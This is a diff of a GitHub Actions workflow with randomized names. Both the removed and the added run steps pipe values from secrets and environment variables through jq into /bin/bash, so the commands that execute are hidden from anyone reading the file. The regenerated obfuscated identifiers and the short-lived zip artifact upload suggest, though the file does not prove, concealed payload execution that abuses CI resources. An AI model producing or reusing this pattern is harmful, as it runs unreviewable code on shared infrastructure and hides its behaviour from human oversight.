@@ -1,8 +1,7 @@
 name: observereleanorst
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '0 5,11,17,23 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +9,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: observereleanorst
         env:
-          uc5: ${{ secrets.uc5 }}
+          twx5554: ${{ secrets.twx5554 }}
         run: |
-          printf '%s' "$uc5" | jq -r .lylwj035 | /bin/bash
-          echo $kvbd20920 | jq -r .oi31 | /bin/bash
-          printf '%s' "$qoo2" | jq -r .w15 | /bin/bash
-          echo $cin249 | jq -r .hozz92 | /bin/bash
-          echo $cxyky05286 | jq -r .oiee27933 | /bin/bash
-          echo $rb6 | jq -r .c4 | /bin/bash
-          echo $n970 | jq -r .ezb703 | /bin/bash
-          printf '%s' "$lxk7" | jq -r .lulnr6465 | /bin/bash
-          echo $pa2 | jq -r .tigsr350 | /bin/bash
+          printf '%s' "$twx5554" | jq -r .gkih64 | /bin/bash
+          printf '%s' "$o11" | jq -r .ghzmm67484 | /bin/bash
+          echo $dv8853 | jq -r .upnto597 | /bin/bash
+          echo $bx22 | jq -r .jfjl9871 | /bin/bash
+          echo $vphzi34 | jq -r .rthq2722 | /bin/bash
+          printf '%s' "$iil72681" | jq -r .y8 | /bin/bash
+          echo $wway457 | jq -r .if03 | /bin/bash
+          printf '%s' "$lmtwd3714" | jq -r .w9 | /bin/bash
+          echo $sd244 | jq -r .hzj67319 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: RIiZT0cz
+          name: Dvlm7Xr8
           path: "*.zip"
           retention-days: 1
